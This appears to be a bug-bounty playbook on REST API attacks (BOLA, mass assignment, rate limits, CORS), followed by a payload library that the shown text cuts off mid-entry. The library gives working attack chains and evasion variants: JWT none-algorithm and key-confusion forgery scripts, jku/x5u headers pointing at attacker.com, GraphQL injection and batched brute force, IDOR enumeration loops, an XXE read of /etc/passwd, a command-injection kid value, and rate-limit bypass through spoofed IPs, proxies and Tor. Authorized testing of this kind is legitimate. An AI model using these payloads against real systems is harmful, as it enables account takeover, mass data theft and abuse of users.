# REST API Security (BOLA / Mass Assignment / Rate / CORS)

> Perspective: black-box; targets common flaws in REST/JSON APIs

## 1. In one sentence

REST API vulnerabilities = treating "endpoints + JSON fields" as the attack surface.
The 4 most common classes: BOLA (an upgraded IDOR), Mass Assignment, missing rate/quota, CORS misconfiguration.
SRC value: BOLA / Mass Assignment are common P1s at large companies ($1k–$8k).

---

## 2. High-frequency entry points

```
/api/v1/...    /api/v2/...
/api/users/{id}    /api/orders/{id}    /api/messages/{id}
/api/users/{id}/orders     # nested
/api/internal/...           # should not be public
/api/admin/...
/api/upload    /api/export    /api/import
```

API docs:
- `/swagger-ui.html`, `/v2/api-docs`, `/openapi.json`, `/api-docs`
- Mobile APP traffic capture (HTTPS MITM / objection / Frida)
- WeChat mini-program wxapkg unpacking then inspecting the request calls

---

## 3. Probing techniques

### 3.1 BOLA / IDOR (OWASP API #1)

```
GET /api/orders/100   Authorization: A → 200 A's order
GET /api/orders/200   Authorization: A → 200 B's order (vulnerability)

# Various ID forms
Numeric incrementing: 100 → 101 → ...
UUID: may be unenumerable, but still may be subject to parameter pollution (e.g. a link is in the response)
Field in body: {"order_id":100} changed to {"order_id":200}
Nested relationship: /users/{you}/orders → /users/{other}/orders
Batch parameter: ?ids=1,2,3,4,5,...,1000
```

### 3.2 Mass Assignment (OWASP API #3)

Add extra fields to test whether the server accepts them:

```json
// registration endpoint
POST /api/users
{"username":"hunter","email":"a@b.c","password":"...",
 "is_admin":true,        // try this
 "role":"admin",          // or this
 "verified":true,
 "balance":1000000,
 "tier":"premium"}

// update endpoint
PATCH /api/users/me
{"is_admin":true}
PATCH /api/orders/123
{"status":"shipped","price":0.01}
```

Finding: when the JSON auto-binds to model fields without a field allowlist.

### 3.3 Resource consumption / rate (OWASP API #4)

```
1. Login endpoint: 100 requests/minute unlimited → credential stuffing
2. SMS verification code: no rate / no graphical CAPTCHA → SMS bombing
3. List endpoint: ?per_page=10000 → performance DoS
4. File upload: no size limit → disk exhaustion
5. Complex query: ?filter=deeply nested → query timeout

Test method:
for i in {1..50}; do curl -I https://target/api/login; done | grep "HTTP"
# 50 consecutive not rejected = missing rate limit
```

### 3.4 Function-level permissions (OWASP API #5)

```
# regular user calling an admin endpoint
DELETE /api/admin/users/1   Authorization: regular user token
→ 200 = vertical escalation

# hidden admin parameters
GET /api/users/me?admin_view=true
GET /api/orders/100?include_audit_log=1

# Method escalation
GET blocked → try POST/PUT/PATCH/OPTIONS

# Protocol upgrade
HTTP → HTTPS-only bypass: test whether HTTP can still access sensitive endpoints
```

### 3.5 CORS misconfiguration

```bash
# 1. Check the CORS headers
curl -H "Origin: https://attacker.com" -I https://target/api/me

# Dangerous combinations
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true     ← dangerous (though the spec disallows * + credentials)

Access-Control-Allow-Origin: https://attacker.com    ← accepts any Origin
Access-Control-Allow-Credentials: true

# 2. null Origin (sandboxed iframe / data: / file:)
curl -H "Origin: null" https://target/api/me

# 3. Subdomain / prefix matching
Origin: https://attacker.target.com    ← if it accepts *.target.com
Origin: https://target.com.attacker.com
```

### 3.6 Error handling / information disclosure

```
?id=null     ?id=[]    ?id={"$gt":0}   ?id=NaN

→ check whether the response contains a stack trace, SQL error, or internal path
```

### 3.7 GraphQL — see `playbooks/graphql.md`

---

## 4. Bypass matrix

| Blocked by | Bypass |
|---|---|
| Authorization required | try Cookie auth / try public-endpoint variants |
| Backend only trusts Authorization, does not validate content | modify the JWT payload (see `oauth-saml-jwt.md`) |
| API docs not public | swagger / openapi / capture mobile / unpack mini-program |
| `is_admin` field blocked | try `isAdmin` / `admin` / `role:1` / `level:99` |
| Rate limit | multiple IPs / X-Forwarded-For injection / multiple tokens |
| Strict CORS | find an XSS / open redirect on a trusted subdomain, then poison |

---

## 5. Exploitation for escalation / lateral

```
BOLA → obtain large batches of user data
Mass Assignment (set is_admin during registration) → admin privileges → backend
Missing rate limit (SMS) → SMS bombing → business cost / user harassment
CORS + cookie auth → cross-origin data theft
```

---

## 6. Real-case fingerprints

Common fingerprints:
- API response contains fields `is_admin`, `role`, `verified`, `balance` → try setting them in reverse
- Registration request body contains `role: "user"` → try changing it to `role: "admin"`
- List endpoint `per_page` has no upper limit → DoS
- `Access-Control-Allow-Origin` reflects any Origin → CORS vulnerability

---

## 7. Reproduction / evidence essentials

### 7.1 BOLA

```http
# baseline (account A views its own)
GET /api/v1/orders/A_OWN_ID    Authorization: Bearer A_TOKEN
→ 200, A's data

# vulnerability (account A views B's)
GET /api/v1/orders/B_OWN_ID    Authorization: Bearer A_TOKEN
→ 200, B's data (redacted sample)
```

### 7.2 Mass Assignment

```http
POST /api/v1/users
Content-Type: application/json
Body: {"username":"hunter","password":"x","email":"a@b.c","is_admin":true}

→ 201 Created, response contains "is_admin":true

# immediately verify with the new account
GET /api/v1/admin/dashboard   Authorization: Bearer NEW_TOKEN
→ 200 admin content
```

### 7.3 CVSS

```
BOLA → large amount of PII        = 6.5–8.1
Mass Assignment → admin           = 8.8–9.8
Missing rate limit → credential stuffing = 7.5
Missing rate limit → SMS bombing  = 5.3–7.5
CORS + credentials                = 7.5–8.1
```

### 7.4 Impact section

```
The GET /api/v1/orders/{id} endpoint does not validate resource ownership; account A can read account B's orders.
I verified the IDOR using two researcher-controlled test accounts; and used 1 random ID to prove traversability,
taking only 1 sample and fully redacting it.
```

---

## Related MCP tools

In practice, jshookmcp can be invoked for automation. **The default `search` profile does not pre-load tools; before invoking, first activate with `mcp__jshook__activate_tools <tool_name>`** (see [`../tools/mcp-jshook.md`](../tools/mcp-jshook.md) §recommended profile).

| Tool | Domain | When to invoke |
|---|---|---|
| `mcp__jshook__graphql_introspect` | graphql | asset expansion / find hidden mutations and undeclared fields |
| `mcp__jshook__graphql_extract_queries` + `mcp__jshook__graphql_replay` | graphql | extract business queries from captured traffic and replay them (changing variables) |
| `mcp__jshook__api_probe_batch` | workflow | batch-probe BOLA / permission differences (single fetch burst) |
| `mcp__jshook__ws_monitor` + `mcp__jshook__ws_get_connections` | streaming | WebSocket frame capture / real-time business endpoints |
| `mcp__jshook__protobuf_decode_raw` | encoding | blindly decode protobuf requests / responses when there is no schema |

Full mapping: [`../tools/mcp-jshook.md`](../tools/mcp-jshook.md)

## 8. Things not to do

- **Forbidden**: actually using the admin privileges after creating an admin via Mass Assignment. Only prove the token has admin.
- **Forbidden**: BOLA batch-traversing more than 10 samples.
- **Forbidden**: using the rate-limit vulnerability to actually send 100 SMS to someone else's phone. At most send 10 to your own phone.
- **Forbidden**: doing a real cross-origin PoC with a CORS vulnerability (having a friend visit attacker.com). Demonstrate in your own browser.

## Payload library

_15 structured web payloads, including full attack chains + WAF/EDR bypass variants_

**Category distribution:** API security (12) · WebSocket security (3)

### · API security

### JWT security vulnerabilities  `jwt-security`
JSON Web Token security-vulnerability exploitation
Sub-category: **JWT** · tags: `jwt` `token` `authentication`

**Prerequisites:** JWT is used for authentication; there is a problem with the JWT configuration or validation

**Attack chain:**

**1. 1. Decode the JWT**
_Decode the JWT content_
```
JWT format: header.payload.signature
Decode:
echo "HEADER" | base64 -d
echo "PAYLOAD" | base64 -d
Or use jwt.io
```

**2. 2. None-algorithm attack**
_Use the None algorithm to bypass signature validation_
```
Change the header to:
{"alg":"none","typ":"JWT"}
After Base64 encoding, construct:
HEADER.PAYLOAD.
(signature part is empty)
```

**3. 3. Weak-key cracking**
_Crack a weak key_
```
Crack with hashcat:
hashcat -m 16500 jwt.txt wordlist.txt
Use jwt_tool:
python3 jwt_tool.py JWT_TOKEN -C -d wordlist.txt
```

**4. 4. Key-confusion attack**
_Algorithm-confusion attack_
```
Change the RS256 algorithm to HS256:
{"alg":"HS256","typ":"JWT"}
Use the public key as the HMAC key to sign
```

**5. 5. Modify the Payload**
_Modify the JWT claims_
```
Modify the user information in the payload:
{"sub":"admin","iat":1234567890}
Re-encode and sign with the known key
```

**WAF/EDR bypass variants:**

**1. JWK/JKU header injection**
_By injecting jwk (an embedded key) or jku (a remote key-set URL) into the JWT Header pointing to an attacker-controlled key, make the server validate the signature with the attacker's key_
```
# JWK embedded public-key injection:
# Embed the attacker's public key in the JWT Header:
{"alg":"RS256","typ":"JWT","jwk":{"kty":"RSA","n":"attacker_n","e":"AQAB"}}
# The server validates the signature using the JWK in the Header

# JKU remote key-set injection:
{"alg":"RS256","typ":"JWT","jku":"http://attacker.com/.well-known/jwks.json"}
# The server fetches the key from an attacker-controlled URL
```

**2. x5c certificate-chain injection**
_By injecting an attacker's self-signed certificate chain via the x5c header, make the server extract the public key from the certificate for validation; the attacker signs with the corresponding private key to forge any JWT_
```
# Generate a self-signed certificate:
openssl req -x509 -nodes -newkey rsa:2048 -keyout attacker.key -out attacker.crt -subj "/CN=attacker"

# Construct the JWT Header:
{"alg":"RS256","x5c":["ATTACKER_CERT_BASE64"]}

# Sign with the attacker's private key, putting the attacker's certificate in x5c
# The server extracts the public key from x5c to validate the signature; the attacker's self-signed cert passes

# Use jwt_tool:
python3 jwt_tool.py <token> -X s -pr attacker.key
```

---

### GraphQL injection attack  `graphql-injection`
GraphQL API injection and information-disclosure attacks
Sub-category: **GraphQL** · tags: `graphql` `api` `injection` `introspection`

**Prerequisites:** the target uses a GraphQL API; there is unauthorized access or an injection point

**Attack chain:**

**1. 1. Probe the GraphQL endpoint**
_Probe the GraphQL endpoint_
```
# Common GraphQL endpoints
/graphql
/api/graphql
/graphql/api
/query
/graphql.php

# Send a POST request
curl -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { types { name } } }"}'
```

**2. 2. Introspection query**
_Execute an introspection query to obtain the API structure_
```
# Full introspection query
{
  __schema {
    types {
      name
      kind
      description
      fields {
        name
        type {
          name
        }
        args {
          name
          type {
            name
          }
        }
      }
    }
  }
}

# Use tools
gqlscan -u http://target.com/graphql
inql -t http://target.com/graphql
```

**3. 3. Batch-query attack**
_Use batch queries to bypass limits_
```
# Alias batch query
{
  user1: user(id: 1) { name email }
  user2: user(id: 2) { name email }
  user3: user(id: 3) { name email }
  user4: user(id: 4) { name email }
}

# Batch query to bypass rate limiting
[
  {"query": "{ user(id: 1) { name } }"},
  {"query": "{ user(id: 2) { name } }"},
  {"query": "{ user(id: 3) { name } }"}
]
```

**4. 4. SQL injection**
_SQL injection in GraphQL_
```
# SQL injection in GraphQL
{
  user(name: "admin' OR '1'='1") {
    id
    name
    password
  }
}

# Injection via a parameter
mutation {
  createUser(input: {
    name: "test' OR 1=1--"
  }) {
    id
  }
}
```

**5. 5. NoSQL injection**
_NoSQL injection in GraphQL_
```
# MongoDB injection
{
  user(filter: {
    $or: [{name: "admin"}, {name: "root"}]
  }) {
    name
    password
  }
}

# Injection via JSON
{
  search(text: "{\"$ne\": \"\"}") {
    results
  }
}
```

**6. 6. Information disclosure**
_Obtain hidden fields and sensitive information_
```
# Obtain hidden fields
{
  user(id: 1) {
    name
    email
    password
    apiKey
    secretKey
    token
    __typename
  }
}

# Enumerate all possible fields
{
  __type(name: "User") {
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}
```

**WAF/EDR bypass variants:**

**1. Field-suggestion bypass**
_Exploit field suggestions and fragment enumeration_
```
# Exploit the field-suggestion feature
query {
  userr(id: 1) { name }
}
# Returns: Did you mean "user"?

# Enumerate hidden fields
query {
  user(id: 1) {
    __typename
    ...on AdminUser {
      adminSecret
    }
  }
}
```

**2. Directive injection**
_Use GraphQL directives to bypass_
```
# Use a directive to bypass
query {
  user(id: 1) @deprecated {
    name
  }
}

# Custom directive attack
mutation @skip(if: false) {
  deleteUser(id: 1)
}
```

---

### GraphQL introspection attack  `graphql-introspection`
Use the GraphQL introspection feature to obtain the API structure
Sub-category: **GraphQL introspection** · tags: `graphql` `introspection` `enumeration` `api`

**Prerequisites:** the target uses GraphQL; introspection is not disabled

**Attack chain:**

**1. 1. Basic introspection**
_Basic introspection query_
```
# Get all types
{
  __schema {
    types {
      name
    }
  }
}

# Get the query type
{
  __schema {
    queryType {
      name
      fields {
        name
        description
      }
    }
  }
}
```

**2. 2. Full introspection**
_Full introspection query to obtain all information_
```
# Get the full API structure
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      ...FullType
    }
    directives {
      name
      description
      locations
      args {
        ...InputValue
      }
    }
  }
}
fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}
fragment InputValue on __InputValue {
  name
  description
  type {
    ...TypeRef
  }
  defaultValue
}
fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
            }
          }
        }
      }
    }
  }
}
```

**3. 3. Analyze with tools**
_Analyze GraphQL with tools_
```
# GraphQL Voyager - visual analysis
# https://github.com/APIs-guru/graphql-voyager

# Use a CLI tool
npm install -g graphql-cli
graphql-cli introspect http://target.com/graphql

# InQL scan
pip install inql
inql -t http://target.com/graphql

# GraphQL Cop
npm install -g graphql-cop
graphql-cop -t http://target.com/graphql
```

**WAF/EDR bypass variants:**

**1. Bypass introspection disabling**
_Bypass introspection-disabling detection_
```
# Some implementations only check a specific string
# Try different formats
query { __schema { types { name } } }
query IntrospectionQuery { __schema { types { name } } }
{"query":"{__schema{types{name}}}"

# Use a GET request
curl "http://target.com/graphql?query={__schema{types{name}}}"
```

---

### GraphQL batch-query attack  `graphql-batching`
Use GraphQL batch queries to bypass rate limiting
Sub-category: **GraphQL batch query** · tags: `graphql` `batching` `rate-limit` `bypass`

**Prerequisites:** the target uses GraphQL; rate limiting exists

**Attack chain:**

**1. 1. Alias batch query**
_Use aliases for a batch query_
```
# Use aliases to query multiple users at once
query {
  user1: user(id: 1) { name email password }
  user2: user(id: 2) { name email password }
  user3: user(id: 3) { name email password }
  user4: user(id: 4) { name email password }
  user5: user(id: 5) { name email password }
}

# Batch enumeration
query {
  users: allUsers(limit: 1000) { id name email }
}
```

**2. 2. Array batch query**
_Use an array for a batch query_
```
# Send multiple query arrays
[
  {"query": "{ user(id: 1) { name } }"},
  {"query": "{ user(id: 2) { name } }"},
  {"query": "{ user(id: 3) { name } }"},
  {"query": "{ user(id: 4) { name } }"}
]

# Send with curl
curl -X POST http://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '[{"query":"{user(id:1){name}}"},{"query":"{user(id:2){name}}"}]'
```

**3. 3. Brute force**
_Batch brute force_
```
# Batch password attempts
mutation {
  attempt1: login(email: "admin@test.com", password: "password1") { token }
  attempt2: login(email: "admin@test.com", password: "password2") { token }
  attempt3: login(email: "admin@test.com", password: "password3") { token }
  attempt4: login(email: "admin@test.com", password: "password4") { token }
  attempt5: login(email: "admin@test.com", password: "password5") { token }
}

# Enumerate users
query {
  check1: userExists(email: "admin@test.com")
  check2: userExists(email: "root@test.com")
  check3: userExists(email: "test@test.com")
}
```

**WAF/EDR bypass variants:**

**1. Bypass batch limits**
_Bypass batch-query limits_
```
# Distribute the query
# Use a different query format
query BatchQuery {
  user1: user(id: 1) { ...UserFields }
  user2: user(id: 2) { ...UserFields }
}
fragment UserFields on User {
  name
  email
}

# Use variables for batching
query GetUser($ids: [ID!]!) {
  users(ids: $ids) {
    name
    email
  }
}
```

---

### REST API security testing  `rest-api-security`
REST API security testing and exploitation
Sub-category: **REST API** · tags: `rest` `api` `security` `testing`

**Prerequisites:** the target uses a REST API; you understand the API endpoints

**Attack chain:**

**1. 1. API endpoint discovery**
_Discover API endpoints_
```
# Common API endpoints
/api/v1/users
/api/v2/products
/api/docs
/api/swagger.json
/api/openapi.json
/swagger-ui.html
/redoc

# Discover with tools
ffuf -u http://target.com/api/FUZZ -w api_endpoints.txt
wfuzz -c -w api_wordlist.txt http://target.com/api/FUZZ
```

**2. 2. Authentication testing**
_Test API authentication_
```
# Test unauthorized access
curl http://target.com/api/v1/users

# Test JWT
curl -H "Authorization: Bearer TOKEN" http://target.com/api/v1/users

# Test API Key
curl -H "X-API-Key: key123" http://target.com/api/v1/users

# Test Basic Auth
curl -u user:pass http://target.com/api/v1/users
```

**3. 3. HTTP-method testing**
_Test HTTP methods_
```
# Test the allowed HTTP methods
curl -X OPTIONS http://target.com/api/v1/users -v

# Try PUT to modify
curl -X PUT -H "Content-Type: application/json" \
  -d '{"name":"hacked"}' http://target.com/api/v1/users/1

# Try DELETE to delete
curl -X DELETE http://target.com/api/v1/users/1

# Try PATCH for partial update
curl -X PATCH -H "Content-Type: application/json" \
  -d '{"role":"admin"}' http://target.com/api/v1/users/1
```

**4. 4. Parameter pollution**
_Test parameter pollution_
```
# Parameter-pollution test
# Duplicate parameters
/api/users?id=1&id=2
/api/users?name=admin&name=user

# Array parameters
/api/users?id[]=1&id[]=2
/api/users?name[0]=admin&name[1]=user

# JSON injection
/api/users?filter={"role":"admin"}
/api/users?sort=role&order=desc; SELECT SLEEP(5)--
```

**5. 5. Content-Type testing**
_Test content-type handling_
```
# Test different Content-Types
curl -H "Content-Type: application/xml" -d "<user><name>test</name></user>" http://target.com/api/users
curl -H "Content-Type: text/plain" -d "name=test" http://target.com/api/users
curl -H "Content-Type: application/x-www-form-urlencoded" -d "name=test" http://target.com/api/users

# XML external entity
curl -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><user><name>&xxe;</name></user>' \
  http://target.com/api/users
```

**WAF/EDR bypass variants:**

**1. API-version bypass**
_Use a different API version to bypass_
```
# Try different API versions
/api/v1/users  # may be fixed
/api/v2/users  # may not be fixed
/api/users     # the old version may have no protection

# Try internal APIs
/internal/api/users
/private/api/users
/_api/users
```

**2. Encoding bypass**
_Use encoding to bypass_
```
# URL encoding
curl http://target.com/api/users/%31  # /users/1

# Unicode encoding
curl http://target.com/api/users/%u0031

# Double URL encoding
curl http://target.com/api/users/%2531
```

---

### JWT None-algorithm attack  `jwt-none-alg`
Use the JWT None algorithm to bypass signature validation
Sub-category: **JWT security** · tags: `jwt` `none` `algorithm` `bypass`

**Prerequisites:** the target uses JWT authentication; the server does not validate the algorithm correctly

**Attack chain:**

**1. 1. Decode the JWT**
_Decode the JWT token_
```
# Online decode
https://jwt.io

# Use the command line
echo "HEADER" | base64 -d
echo "PAYLOAD" | base64 -d

# Use Python
import jwt
decoded = jwt.decode(token, options={"verify_signature": False})
print(decoded)
```

**2. 2. Construct a None-algorithm Token**
_Construct a None-algorithm Token_
```
# Change the header to the none algorithm
# Original header
{"alg":"HS256","typ":"JWT"}

# Change to
{"alg":"none","typ":"JWT"}
{"alg":"None","typ":"JWT"}
{"alg":"NONE","typ":"JWT"}
{"alg":"nOnE","typ":"JWT"}

# Construct with Python
import base64, json
header = {"alg":"none","typ":"JWT"}
payload = {"sub":"admin","iat":1516239022}
token = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip("=") + "." + \
        base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip("=") + "."
print(token)
```

**3. 3. Modify user privileges**
_Modify user privileges_
```
# Modify the payload to escalate
# Original payload
{"sub":"user","role":"user","iat":1516239022}

# Change to
{"sub":"admin","role":"admin","iat":1516239022}

# Full attack
import base64, json
header = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').decode().rstrip("=")
payload = base64.urlsafe_b64encode(b'{"sub":"admin","role":"admin"}').decode().rstrip("=")
token = header + "." + payload + "."
print(token)
```

**4. 4. Send the malicious Token**
_Send the malicious Token_
```
# Send with curl
curl -H "Authorization: Bearer <MALICIOUS_TOKEN>" http://target.com/api/admin

# Empty-signature test
curl -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9." http://target.com/api/admin
```

**WAF/EDR bypass variants:**

**1. Algorithm confusion**
_Try algorithm variants_
```
# Try different variants
{"alg":"none"}
{"alg":"None"}
{"alg":"NONE"}
{"alg":"nOnE"}
{"alg":""}
{"alg":null}

# Remove the alg field
{"typ":"JWT"}
```

**2. Signature bypass**
_Signature-bypass variants_
```
# Empty signature
header.payload.

# Arbitrary signature
header.payload.anysignature

# Use the original signature
# Some libraries ignore signature validation
```

---

### JWT key-confusion attack  `jwt-key-confusion`
Use JWT algorithm confusion to bypass the signature
Sub-category: **JWT security** · tags: `jwt` `algorithm` `confusion` `rs256`

**Prerequisites:** the target uses the RS256 algorithm; the public key can be obtained

**Attack chain:**

**1. 1. Obtain the public key**
_Obtain the JWT public key_
```
# Obtain from the certificate
curl -k https://target.com/.well-known/jwks.json

# Obtain from the SSL certificate
echo | openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -pubkey -noout

# Obtain from the JWT header
# Decode the JWT header, look for the x5c or jku field

# Common public-key locations
/.well-known/jwks.json
/api/keys
/public.key
/pubkey.pem
```

**2. 2. Algorithm-confusion attack**
_Algorithm-confusion attack_
```
# Change RS256 to HS256
# Use the public key as the HMAC key

import jwt
import base64

# Obtain the public key
public_key = open("public.pem").read()

# Construct the payload
payload = {"sub":"admin","role":"admin"}

# Sign using the public key as the HMAC key
token = jwt.encode(payload, public_key, algorithm="HS256")
print(token)
```

**3. 3. Send the malicious Token**
_Send the malicious Token_
```
# Use the constructed Token
curl -H "Authorization: Bearer <HS256_TOKEN>" http://target.com/api/admin

# Python script
import requests
headers = {"Authorization": f"Bearer {token}"}
response = requests.get("http://target.com/api/admin", headers=headers)
print(response.text)
```

**WAF/EDR bypass variants:**

**1. kid injection**
_Inject via the kid parameter_
```
# kid parameter injection
# Modify the kid field of the JWT header
{"alg":"HS256","typ":"JWT","kid":"../../dev/null"}

# SQL injection kid
{"alg":"HS256","typ":"JWT","kid":"key UNION SELECT secret--"}

# Command injection kid
{"alg":"HS256","typ":"JWT","kid":"|/bin/bash -c id"}
```

**2. jku/x5u bypass**
_Bypass via jku/x5u_
```
# jku points to the attacker's server
{"alg":"RS256","typ":"JWT","jku":"https://attacker.com/.well-known/jwks.json"}

# x5u points to the attacker's certificate
{"alg":"RS256","typ":"JWT","x5u":"https://attacker.com/cert.pem"}

# Host the malicious key on the attacker's server
```

---

### IDOR insecure direct object reference  `api-idor`
Use an IDOR vulnerability to access unauthorized resources
Sub-category: **IDOR** · tags: `idor` `api` `authorization` `bypass`

**Prerequisites:** the target references resources by ID; there is an authorization-check flaw

**Attack chain:**

**1. 1. Identify the ID parameter**
_Identify the ID parameter_
```
# Common ID-parameter locations
/api/users/123
/api/orders?id=123
/api/documents/abc-123
/api/profile?user_id=123

# Observe the response
# Record the data difference returned for different IDs
```

**2. 2. Enumerate IDs**
_Enumerate ID values_
```
# Numeric ID enumeration
for i in $(seq 1 1000); do
  curl -H "Authorization: Bearer $TOKEN" "http://target.com/api/users/$i" >> output.txt
done

# Use Burp Intruder
# Payload: Numbers 1-10000
# GET /api/users/{id}

# UUID enumeration
# Use ffuf
ffuf -u http://target.com/api/users/FUZZ -w uuid_list.txt -H "Authorization: Bearer TOKEN"
```

**3. 3. Batch detection**
_Batch-detect IDOR_
```
# Python script for batch detection
import requests

token = "YOUR_TOKEN"
for i in range(1, 100):
    r = requests.get(
        f"http://target.com/api/users/{i}",
        headers={"Authorization": f"Bearer {token}"}
    )
    if r.status_code == 200:
        print(f"ID {i}: {r.json()}")

# Detect data leakage
# Compare the responses of different users accessing the same ID
```

**4. 4. Cross-user access**
_Cross-user access test_
```
# Try to access other users' data
# Use user A's Token to access user B's data

# Modify the ID in the request
GET /api/users/2  # originally user 1
GET /api/orders?user_id=2  # originally user_id=1

# Modify the POST/PUT request body
{
  "user_id": 2,  # change to another user's ID
  "amount": 1000
}
```

**WAF/EDR bypass variants:**

**1. ID-variant bypass**
_ID-variant bypass_
```
# Numeric variants
/api/users/001
/api/users/1
/api/users/0x1
/api/users/1.0

# Encoding bypass
/api/users/%31  # URL encoding
/api/users/MSAg  # Base64 encoding

# Array bypass
/api/users?id[]=1&id[]=2
/api/users[0]=1&users[1]=2
```

**2. Parameter pollution**
_Parameter-pollution bypass_
```
# Parameter pollution
/api/users?id=1&id=2
/api/users?id=2&id=1

# JSON injection
{"id": 1, "id": 2}

# Batch operation
/api/users/batch?ids=1,2,3,4,5
```

---

### API rate-limit bypass  `api-rate-limit`
Bypass API rate limiting for brute-force attacks
Sub-category: **rate limit** · tags: `api` `rate-limit` `bypass` `brute-force`

**Prerequisites:** the target has rate limiting; the limit implementation has flaws

**Attack chain:**

**1. 1. Detect the rate limit**
_Detect the rate limit_
```
# Rapidly send requests to detect the limit
for i in $(seq 1 100); do
  curl -s -o /dev/null -w "%{http_code}\n" http://target.com/api/test
done

# Observe the response
# 429 Too Many Requests
# 403 Forbidden
# Custom error message
```

**2. 2. IP bypass**
_Use IP headers to bypass_
```
# X-Forwarded-For bypass
curl -H "X-Forwarded-For: 1.2.3.4" http://target.com/api/test
curl -H "X-Forwarded-For: 1.2.3.5" http://target.com/api/test
curl -H "X-Forwarded-For: 1.2.3.6" http://target.com/api/test

# Other IP headers
X-Real-IP: 1.2.3.4
X-Originating-IP: 1.2.3.4
X-Remote-IP: 1.2.3.4
X-Client-IP: 1.2.3.4
True-Client-IP: 1.2.3.4

# Automation
for i in $(seq 1 100); do
  curl -H "X-Forwarded-For: 1.2.3.$i" http://target.com/api/test
done
```

**3. 3. Distributed bypass**
_Distributed rate-limit bypass_
```
# Use multiple proxies
# Configure a proxy pool
proxies = [
    "http://proxy1:8080",
    "http://proxy2:8080",
    "http://proxy3:8080"
]

# Python script
import requests
proxies_list = ["http://proxy1:8080", "http://proxy2:8080"]
for i, proxy in enumerate(proxies_list):
    requests.get("http://target.com/api/test", proxies={"http": proxy})

# Use Tor
# Switch the Tor circuit for each request
import stem.process
import requests

# Use cloud functions
# AWS Lambda, Azure Functions, etc.
```

**4. 4. Other bypass techniques**
_Other bypass techniques_
```
# User-agent bypass
curl -A "Googlebot" http://target.com/api/test
curl -A "Bingbot" http://target.com/api/test

# Authentication bypass
# Use different accounts
for token in $TOKENS; do
  curl -H "Authorization: Bearer $token" http://target.com/api/test
done

# HTTP/2 multiplexing
# Send multiple requests over a single connection

# Slow requests
# Slowloris attack
```

**WAF/EDR bypass variants:**

**1. API Key rotation**
_API Key rotation_
```
# Use multiple API Keys
api_keys = ["key1", "key2", "key3", "key4"]
for i, key in enumerate(api_keys):
    requests.get("http://target.com/api/test", headers={"X-API-Key": key})

# Register multiple accounts to obtain multiple Tokens
```

**2. Request distribution**
_Request distribution_
```
# Add delay
import time
for i in range(100):
    requests.get("http://target.com/api/test")
    time.sleep(0.5)  # 0.5-second gap between each request

# Distribute across different time periods
# Use scheduled tasks to distribute requests
```

---

### Mass-assignment vulnerability  `api-mass-assignment`
Use a mass-assignment vulnerability to modify sensitive fields
Sub-category: **mass assignment** · tags: `api` `mass-assignment` `privilege-escalation`

**Prerequisites:** the API accepts JSON input; there are unfiltered fields

**Attack chain:**

**1. 1. Identify the input fields**
_Identify the returned fields_
```
# Normal request
POST /api/users
{
  "name": "test",
  "email": "test@test.com"
}

# Observe the response
{
  "id": 1,
  "name": "test",
  "email": "test@test.com",
  "role": "user",
  "isAdmin": false,
  "createdAt": "2024-01-01"
}
```

**2. 2. Add sensitive fields**
_Add sensitive fields_
```
# Try adding the role field
POST /api/users
{
  "name": "test",
  "email": "test@test.com",
  "role": "admin"
}

# Try isAdmin
{
  "name": "test",
  "email": "test@test.com",
  "isAdmin": true
}

# Try multiple fields
{
  "name": "test",
  "email": "test@test.com",
  "role": "admin",
  "isAdmin": true,
  "permissions": ["read", "write", "delete"]
}
```

**3. 3. Update operation**
_Update-operation test_
```
# PUT/PATCH update
PATCH /api/users/123
{
  "role": "admin"
}

# Try to modify another user
PATCH /api/users/1
{
  "role": "admin"
}

# Try to modify the password
PATCH /api/users/me
{
  "password": "newpassword123"
}
```

**4. 4. Nested objects**
_Nested-object test_
```
# Nested-object assignment
{
  "name": "test",
  "settings": {
    "notifications": true,
    "isAdmin": true
  }
}

# Array assignment
{
  "name": "test",
  "roles": ["admin", "superadmin"]
}
```

**WAF/EDR bypass variants:**

**1. Field variants**
_Try field variants_
```
# Try different field names
is_admin, is_Admin, IS_ADMIN
admin, Admin, ADMIN
user_type, userType, user_type_id

# Try internal fields
__v, _id, created_at, updated_at
password_hash, passwordHash
```

**2. Type confusion**
_Type-confusion test_
```
# Number to boolean
{"isAdmin": 1}
{"isAdmin": "true"}

# Array to string
{"roles": "admin"}

# Object to array
{"settings": ["admin"]}
```

---

### BOLA broken object-level authorization  `api-bola`
Use a BOLA vulnerability to access unauthorized objects
Sub-category: **BOLA** · tags: `api` `bola` `authorization` `idor`

**Prerequisites:** the API uses object IDs; there is an authorization-check flaw

**Attack chain:**

**1. 1. Identify object access**
_Identify object-access patterns_
```
# Observe the API endpoints
GET /api/users/{user_id}/documents
GET /api/teams/{team_id}/members
GET /api/orders/{order_id}

# Analyze the object relationships
# User -> document
# Team -> member
# Order -> user
```

**2. 2. Test authorization**
_Test the authorization check_
```
# Create two accounts to test
# User A: user_a_token
# User B: user_b_token

# User A creates a resource
POST /api/documents
Authorization: Bearer user_a_token
{"title": "Secret Doc"}
# Returns: {"id": "doc_123"}

# User B tries to access it
GET /api/documents/doc_123
Authorization: Bearer user_b_token
# If it returns 200, BOLA exists
```

**3. 3. Horizontal access**
_Horizontal-access test_
```
# Enumerate other users' resources
